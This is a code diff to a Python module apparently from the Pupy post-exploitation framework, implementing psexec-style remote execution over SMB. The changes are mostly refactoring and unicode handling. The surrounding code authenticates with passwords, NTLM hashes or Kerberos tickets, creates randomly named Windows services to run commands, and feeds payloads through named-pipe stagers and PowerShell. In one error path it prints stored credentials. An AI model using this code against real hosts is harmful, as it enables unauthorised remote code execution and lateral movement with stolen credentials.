@@ -11,14 +11,13 @@ import random
 import os
 import string
 import socket
+import sys
 
 try:
     import idna
     assert idna
 except ImportError:
     pass
-
-import encodings
 
 from io import open
 from base64 import b64encode
@@ -43,6 +42,9 @@ from impacket.smb3structs import (
 from sys import getdefaultencoding, version_info
 
 from network.lib.netcreds import add_cred, find_first_cred
+from network.lib.convcompat import (
+    try_as_unicode_string, as_unicode_string
+)
 
 from Crypto.Cipher import DES
 assert(DES)
@@ -70,22 +72,14 @@ SERVICE_STATUS_STR = {
 class PsExecException(Exception):
     def as_unicode(self, codepage=None):
         if not hasattr(self, 'message'):
-            return str(self)
+            error = str(self)
+        else:
+            error = self.message
 
-        error = self.message
-        if not isinstance(error, str):
+        if not isinstance(error, (str, bytes)):
             error = str(error)
 
-        try:
-            if codepage:
-                error = error.decode(codepage)
-            else:
-                error = error.decode(getdefaultencoding())
-
-            return error
-
-        except UnicodeError:
-            return error.decode('latin1')
+        return try_as_unicode_string(error)
 
 
 # Use Start-Transcript -Path "C:\\temp\\transcript.log" -Force; to debug
@@ -207,22 +201,6 @@ POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 SERVICE_NAME   = ''.join(random.sample(string.ascii_letters, 10))
 
-if 'idna' not in encodings._cache or not encodings._cache['idna']:
-    if 'idna' in encodings._cache:
-        del encodings._cache['idna']
-
-    try:
-        import encodings.idna
-    except ImportError:
-        message = 'IDNA module was not loaded. Reload modules with:' + (
-            '\n'.join([
-                'load_package -f {}'.format(module) for module in (
-                    'encodings.idna', 'pupyutils.psexec'
-                )]))
-        raise RuntimeError(message)
-
-    encodings._cache['idna'] = encodings.idna.getregentry()
-
 
 def generate_stager_cmd(size=1024):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
@@ -233,14 +211,18 @@ def generate_stager_cmd(size=1024):
 
 
 def generate_loader_payload(size):
-    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    pipename = ''.join(random.choice(
+        string.ascii_uppercase + string.digits) for _ in xrange(10)
+    )
     payload = PIPE_LOADER_TEMPLATE.format(pipename=pipename, size=size)
     return payload, pipename
 
 
 def generate_stdo_payload(arg0, argv):
     argv = ' '.join(argv)
-    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    pipename = ''.join(
+        random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10)
+    )
     payload = PIPE_STDOUT_TEMPLATE.format(
         pipename=pipename, size=1024, arg0=arg0, argv=argv)
     return payload, pipename, arg0, argv
@@ -254,8 +236,9 @@ class ConnectionInfo(object):
         '_smb_conn', '_wbem_conn', '_dcom_conn', '_use_cache', '_cached'
     )
 
-    def __init__(self, host, port=445, user='', domain='', password='', ntlm='',
-                 aes='', tgt='', tgs='', kdc='', timeout=10, use_cache=None):
+    def __init__(
+        self, host, port=445, user='', domain='', password='', ntlm='',
+            aes='', tgt='', tgs='', kdc='', timeout=10, use_cache=None):
 
         self._smb_conn = None
         self._wbem_conn = None
@@ -266,18 +249,6 @@ class ConnectionInfo(object):
             use_cache = USE_CACHE
 
         self._use_cache = use_cache
-
-        if host and not isinstance(host, str):
-            host = host.encode('utf-8')
-
-        if user and not isinstance(user, str):
-            user = user.encode('utf-8')
-
-        if password and not isinstance(password, str):
-            password = password.encode('utf-8')
-
-        if domain and not isinstance(domain, str):
-            domain = domain.encode('utf-8')
 
         creds = find_first_cred(
             schema='smb', address=host, port=port,
@@ -503,7 +474,10 @@ class ConnectionInfo(object):
                     self.domain, self.lm, self.nt,
                     self.aes, self.KDC, self.TGT, self.TGS)
             else:
-                smb.login(self.user, self.password, self.domain, self.lm, self.nt)
+                smb.login(
+                    self.user, self.password, self.domain,
+                    self.lm, self.nt
+                )
 
             self.valid = True
 
@@ -529,7 +503,10 @@ class ConnectionInfo(object):
             raise PsExecException(e)
 
         except Exception as e:
-            error = '{}: {}\n{}'.format(type(e).__name__, e, traceback.format_exc())
+            error = '{}: {}\n{}'.format(
+                type(e).__name__, e, traceback.format_exc()
+            )
+
             raise PsExecException(error)
 
 
@@ -579,14 +556,15 @@ class FileTransfer(object):
 
         te = type(self._exception)
         if te in (UnicodeEncodeError, UnicodeDecodeError):
-            return 'Could not convert name to unicode. Use -c option to specify encoding'
+            return 'Could not convert name to unicode. ' \
+                'Use -c option to specify encoding'
         elif te == SessionError:
             error = self._exception.getErrorString()[1]
             if isinstance(error, bytes):
                 error = error.decode(getdefaultencoding())
             return error
         else:
-            return te.__name__ +": " + str(self._exception)
+            return te.__name__ + ': ' + str(self._exception)
 
     @property
     def ok(self):
@@ -601,7 +579,9 @@ class FileTransfer(object):
 
         try:
             return [
-                x['shi1_netname'][:-1] for x in self._conn.listShares()
+                as_unicode_string(
+                    x['shi1_netname'][:-1]
+                ) for x in self._conn.listShares()
             ]
 
         except Exception as e:
@@ -647,8 +627,14 @@ class FileTransfer(object):
                     continue
 
                 listing.append((
-                    f.get_longname(), f.is_directory() > 0,
-                    f.get_filesize(), time.ctime(float(f.get_mtime_epoch()))
+                    try_as_unicode_string(
+                        f.get_longname(), fail=False
+                    ),
+                    f.is_directory() > 0,
+                    f.get_filesize(),
+                    as_unicode_string(
+                        time.ctime(float(f.get_mtime_epoch()))
+                    )
                 ))
             return listing
 
@@ -691,7 +677,7 @@ class FileTransfer(object):
                 local = os.path.expandvars(local)
                 local = os.path.expanduser(local)
 
-                with open(local, 'w+b') as destination:
+                with open(local, 'wb') as destination:
                     self._conn.getFile(
                         share,
                         remote,
@@ -715,7 +701,9 @@ class FileTransfer(object):
                 local = os.path.expanduser(local)
 
                 if not os.path.exists(local):
-                    raise ValueError('Local file ({}) does not exists'.format(local))
+                    raise ValueError(
+                        'Local file ({}) does not exists'.format(local)
+                    )
 
                 with open(local, 'rb') as source:
                     self._conn.putFile(
@@ -730,7 +718,8 @@ class FileTransfer(object):
             self._exception = e
 
     def push_to_pipe(self, pipe, data, timeout=90):
-        with self.open_pipe(pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, timeout) as pipe:
+        with self.open_pipe(
+                pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, timeout) as pipe:
             # Write by small chunks (1.4 KB)
             # Slow, but should work with crappy networks
             for offset in xrange(0, len(data), 1400):
@@ -756,7 +745,7 @@ class ShellService(object):
 
     def __init__(self, rpc, name=SERVICE_NAME):
         if not isinstance(name, bytes):
-            name = name.encode('latin1', errors='ignore')
+            name = name.encode(sys.getfilesystemencoding())
 
         self._name = name + b'\x00'
 
@@ -774,7 +763,8 @@ class ShellService(object):
             self._serviceHandle = resp['lpServiceHandle']
 
         except Exception as e:
-            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_DOES_NOT_EXIST:
+            if hasattr(e, 'error_code') and \
+                    e.error_code == ERROR_SERVICE_DOES_NOT_EXIST:
                 pass
             else:
                 raise
@@ -782,6 +772,11 @@ class ShellService(object):
     def create(self, command):
         if self._serviceHandle:
             raise ShellServiceAlreadyExists()
+
+        if not isinstance(command, bytes):
+            command = command.encode(
+                sys.getfilesystemencoding, errors='ignore'
+            )
 
         if not command.endswith(b'\x00'):
             command += b'\x00'
@@ -805,7 +800,8 @@ class ShellService(object):
         try:
             scmr.hRStartServiceW(self._scmr, self._serviceHandle)
         except Exception as e:
-            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_REQUEST_TIMEOUT:
+            if hasattr(e, 'error_code') and \
+                    e.error_code == ERROR_SERVICE_REQUEST_TIMEOUT:
                 return False
 
             raise
@@ -846,7 +842,10 @@ class ShellService(object):
             raise ShellServiceIsNotExists()
 
         try:
-            scmr.hRControlService(self._scmr, self._serviceHandle, scmr.SERVICE_CONTROL_STOP)
+            scmr.hRControlService(
+                self._scmr, self._serviceHandle,
+                scmr.SERVICE_CONTROL_STOP
+            )
         except Exception as e:
 
             try:
@@ -855,7 +854,8 @@ class ShellService(object):
                 scmr.hRCloseServiceHandle(self._scmr, self._serviceHandle)
                 self._serviceHandle = None
 
-            if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_NOT_ACTIVE:
+            if hasattr(e, 'error_code') and \
+                    e.error_code == ERROR_SERVICE_NOT_ACTIVE:
                 pass
             else:
                 raise
@@ -868,11 +868,14 @@ def create_filetransfer(*args, **kwargs):
         return FileTransfer(smbc, info.cached), None
 
     except PsExecException as e:
-        return None, e.as_unicode(kwargs.get('codepage', None)) + ' CREDS:{}'.format(info.credentials)
+        return None, ' '.join([
+            e.as_unicode(kwargs.get('codepage', None)),
+            'CREDS: {}'.format(info.credentials)
+        ])
 
 
 def sc(conninfo, command, output=True, on_data=None, on_exec=None):
-    rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
+    rpc = conninfo.create_pipe_dce_rpc('\\pipe\\svcctl')
     ft = None
 
     payload = None
@@ -939,7 +942,11 @@ def sc(conninfo, command, output=True, on_data=None, on_exec=None):
             starter.start()
 
             if on_data:
-                on_data(False, 'Service {} (hopefully) started'.format(service.name))
+                on_data(
+                    False, 'Service {} (hopefully) started'.format(
+                        service.name
+                    )
+                )
 
             ft = FileTransfer(
                 conninfo.create_smb_connection(
@@ -953,9 +960,15 @@ def sc(conninfo, command, output=True, on_data=None, on_exec=None):
 
             try:
                 if on_data:
-                    on_data(False, 'Connecting to stager (pipe={})'.format(stager_pipe))
+                    on_data(
+                        False, 'Connecting to stager (pipe={})'.format(
+                            stager_pipe
+                        )
+                    )
 
-                with ft.open_pipe(stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, conninfo.timeout) as pipe:
+                with ft.open_pipe(
+                    stager_pipe, FILE_WRITE_DATA | FILE_APPEND_DATA,
+                        conninfo.timeout) as pipe:
                     if on_data:
                         on_data(False, 'Connected to the stager pipe')
 
@@ -1313,12 +1326,8 @@ def set_use_cache(use_cache):
 
 
 def pupy_smb_exec(
-    host, port,
-    user, domain,
-    password, ntlm,
-    payload,
-    execm='smbexec',
-    timeout=90, log_cb=None):
+    host, port, user, domain, password, ntlm, payload,
+        execm='smbexec', timeout=90, log_cb=None):
 
     size = len(payload)
 
